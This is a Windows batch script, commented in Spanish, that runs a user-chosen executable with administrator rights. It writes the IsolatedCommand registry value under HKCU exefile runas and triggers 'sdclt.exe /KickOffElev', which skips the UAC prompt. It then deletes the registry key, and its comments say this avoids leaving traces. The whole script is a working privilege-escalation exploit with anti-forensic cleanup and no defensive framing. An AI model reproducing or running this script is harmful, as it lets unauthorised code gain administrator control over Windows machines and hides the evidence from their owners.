@echo off
:: Ruta al programa a ejecutar como administrador
set PAYLOAD=C:\Users\baa4t\Desktop\W\x64\Release\W.exe

:: Crear la clave de registro necesaria para el bypass
reg add "HKCU\Software\Classes\exefile\shell\runas\command" /v IsolatedCommand /t REG_SZ /d "%PAYLOAD%" /f

:: Ejecutar sdclt para disparar la elevación
sdclt.exe /KickOffElev

:: Limpieza: opcional, elimina la clave para no dejar rastros
reg delete "HKCU\Software\Classes\exefile\shell\runas\command" /v IsolatedCommand /f
